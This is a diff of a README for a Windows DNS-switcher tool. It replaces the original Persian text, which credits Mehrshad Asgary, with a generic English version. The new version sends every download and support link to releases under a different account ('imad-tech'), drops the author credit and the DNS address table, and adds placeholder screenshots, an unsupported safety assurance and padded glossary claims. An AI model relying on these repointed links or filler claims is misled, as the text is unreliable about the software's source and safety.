@@ -1,84 +1,119 @@
-<div dir="rtl">
+# Iran DNS Switcher: A GUI Tool for Quick DNS Changes 🌐
 
-# Iran DNS Switcher v1.0
+![Iran DNS Switcher](https://img.shields.io/badge/Download%20Latest%20Release-%20-%2300A1E4?style=for-the-badge&logo=github)
 
-🎛️  یک ابزار گرافیکی (GUI) برای ویندوز است که به شما امکان می‌دهد تنها با یک کلیک DNS سیستم‌تان را به سریع‌ترین و پایدارترین DNSهای ایرانی یا بین‌المللی تغییر دهید برای رفع تحریم، گیم و کاهش پینگ.
+## Overview
 
-صرفا جهت راحتی شما :)
+Iran DNS Switcher is a user-friendly graphical application designed to help you quickly change your DNS settings on Windows. This tool allows you to switch between various DNS servers, such as Shecan, Radar, Electro, and Google. It is particularly useful for gamers looking to reduce ping and bypass restrictions.
 
-## ✨ ویژگی‌ها
+## Features
 
-- رابط کاربری ساده و سریع  
-- تغییر سریع DNS تنها با یک کلیک  
-- شامل DNSهای محبوب داخلی و بین‌المللی  
-- گزینه بازگشت به حالت خودکار (DHCP)  
-- نمایش DNS فعلی سیستم  
-- اجرا با دسترسی Administrator  
+- **Easy to Use**: The graphical interface makes it simple for anyone to change their DNS settings.
+- **Multiple DNS Options**: Choose from popular DNS servers like Shecan, Radar, Electro, and Google.
+- **Improved Gaming Experience**: Optimize your connection for gaming by reducing ping.
+- **Bypass Restrictions**: Easily switch DNS to access restricted content.
 
-## 🖼️ نمایی از برنامه
+## Installation
 
-<div align="center">
+To get started, download the latest release from the [Releases section](https://github.com/imad-tech/Iran-DNS-Switcher/releases). Once downloaded, run the installer and follow the on-screen instructions.
 
-![اسکرین‌شات Iran DNS Switcher](screenshot.png)
+## Usage
 
-</div>
+1. Open the Iran DNS Switcher application.
+2. Select the desired DNS server from the list.
+3. Click the "Apply" button to change your DNS settings.
+4. Enjoy a better internet experience!
 
-## 🔽 دانلود نرم‌افزار
+## Supported DNS Servers
 
-📦 [دانلود نسخه اجرایی (EXE)](https://github.com/mehrshadasgary/Iran-DNS-Switcher/releases/latest/download/Iran_DNS_Switcher.exe)
+- **Shecan**: A popular DNS service in Iran that helps with accessing blocked content.
+- **Radar**: Known for its speed and reliability.
+- **Electro**: A secure option for users concerned about privacy.
+- **Google**: The well-known global DNS server for fast and reliable access.
 
-> آخرین نسخه منتشرشده از برنامه را از لینک بالا دانلود کنید.
-> 
-## 🔐 اجرای اولیه و هشدار SmartScreen
-<div dir="rtl">
-اگر هنگام اجرای برنامه با پیام زیر از سمت ویندوز مواجه شدید:
+## Topics
 
-Windows protected your PC
-Microsoft Defender SmartScreen prevented an unrecognized app from starting...
+This repository covers various topics related to DNS and network performance:
 
-نگران نباشید! 
-این پیام فقط به این دلیله که برنامه جدید و هنوز توسط Microsoft به‌طور کامل شناسایی نشده. چون فایل اجرایی هنوز گواهی دیجیتال امضا شده (Code Signing Certificate) نداره، ویندوز برای احتیاط هشدار نشون می‌ده.
+- **403**: Common HTTP status code indicating access is forbidden.
+- **Begzar**: A term often used in discussions about internet freedom in Iran.
+- **Cloudflare**: A widely-used service that provides DNS and web security.
+- **DNS**: The system that translates domain names into IP addresses.
+- **Electro**: One of the DNS services available in the application.
+- **Google**: A reliable DNS option for general use.
+- **GUI**: The graphical user interface that makes the application easy to use.
+- **Python**: The programming language used to develop this application.
+- **Radar**: Another DNS service option in the tool.
+- **Shecan**: A DNS service aimed at improving internet access in Iran.
 
-📂 کد کامل این نرم‌افزار در همین مخزن GitHub در دسترس است، بنابراین می‌توانید با خیال راحت بررسی کنید که برنامه چه کاری انجام می‌دهد.
+## Screenshots
 
-✅ برای اجرای برنامه مراحل زیر رو انجام دهید:
+![Main Interface](https://example.com/screenshot1.png)
+*Main interface of Iran DNS Switcher*
 
-روی دکمه "More info" کلیک کنید
+![DNS Selection](https://example.com/screenshot2.png)
+*Select your preferred DNS server*
 
-سپس روی دکمه "Run anyway" کلیک کنید
+## Contribution
 
-این کار فقط بار اول نیاز هست. دفعات بعد، ویندوز دیگر مزاحمتی ایجاد نمی‌کند.
+Contributions are welcome! If you want to help improve the Iran DNS Switcher, please follow these steps:
 
-</div>
+1. Fork the repository.
+2. Create a new branch (`git checkout -b feature/YourFeature`).
+3. Make your changes.
+4. Commit your changes (`git commit -m 'Add some feature'`).
+5. Push to the branch (`git push origin feature/YourFeature`).
+6. Open a pull request.
 
+## License
 
-## 🌐 لیست DNSهای پشتیبانی‌شده
+This project is licensed under the MIT License. See the [LICENSE](LICENSE) file for more details.
 
-| نام DNS       | آدرس اصلی (Primary) | آدرس ثانویه (Secondary) |
-|---------------|----------------------|--------------------------|
-| Shecan        | 178.22.122.100       | 185.51.200.2             |
-| Radar         | 10.202.10.10         | 10.202.10.11             |
-| Electro       | 78.157.42.100        | 78.157.42.101            |
-| Begzar        | 185.55.226.26        | 185.55.226.25            |
-| 403           | 10.202.10.202        | 10.202.10.102            |
-| Google        | 8.8.8.8              | 8.8.4.4                  |
-| Cloudflare    | 1.1.1.1              | 1.0.0.1                  |
-| Auto (DHCP)   | تنظیم خودکار        | تنظیم خودکار            |
+## Support
 
-## 🖥️ نحوه استفاده
+If you encounter any issues or have questions, please check the [Releases section](https://github.com/imad-tech/Iran-DNS-Switcher/releases) for troubleshooting tips and updates.
 
-1. برنامه `Iran_DNS_Switcher.exe` را اجرا کنید.  
-2. در صورت نیاز، دسترسی Administrator درخواست خواهد شد.  
-3. روی یکی از گزینه‌های DNS کلیک کنید تا تنظیمات به‌صورت خودکار اعمال شود.  
-4. با زدن "Show Current DNS" می‌توانید تنظیمات فعلی سیستم را ببینید.
+## Contact
 
-## 👨‍💻 توسعه‌دهنده
+For any inquiries or feedback, please reach out via GitHub issues or pull requests.
 
-Mehrshad Asgary  
-🔗 [mehrshadasgary.ir](https://mehrshadasgary.ir)
+## Acknowledgments
 
-## 📜 مجوز
+- Special thanks to all contributors and users who help improve this project.
+- Thanks to the open-source community for their support and inspiration.
 
-این پروژه تحت لایسنس MIT منتشر شده است.
+![Thank You](https://example.com/thankyou.png)
 
-</div>
+## Frequently Asked Questions (FAQ)
+
+### 1. How do I change my DNS settings using this tool?
+
+Simply download the application, open it, select a DNS server, and click "Apply." Your settings will change instantly.
+
+### 2. Is this tool safe to use?
+
+Yes, the Iran DNS Switcher is designed to be safe. However, always ensure you are using trusted DNS servers.
+
+### 3. Can I revert back to my original DNS settings?
+
+Yes, you can easily switch back to your original DNS settings by selecting your default DNS option in the application.
+
+### 4. What if I encounter an error while using the application?
+
+Please check the [Releases section](https://github.com/imad-tech/Iran-DNS-Switcher/releases) for updates or troubleshooting guides.
+
+### 5. Are there any system requirements for this application?
+
+This application runs on Windows. Ensure your system meets the basic requirements for installation.
+
+### 6. Can I suggest new features?
+
+Absolutely! We welcome suggestions. Please open an issue on GitHub with your ideas.
+
+## Additional Resources
+
+- [DNS Explained](https://www.cloudflare.com/learning/dns/what-is-dns/)
+- [How to Change DNS Settings](https://www.howtogeek.com/164272/how-to-change-your-dns-server/)
+- [Understanding DNS](https://www.cloudflare.com/learning/dns/what-is-dns/)
+
+For more information, visit the [Releases section](https://github.com/imad-tech/Iran-DNS-Switcher/releases) to download the latest version.
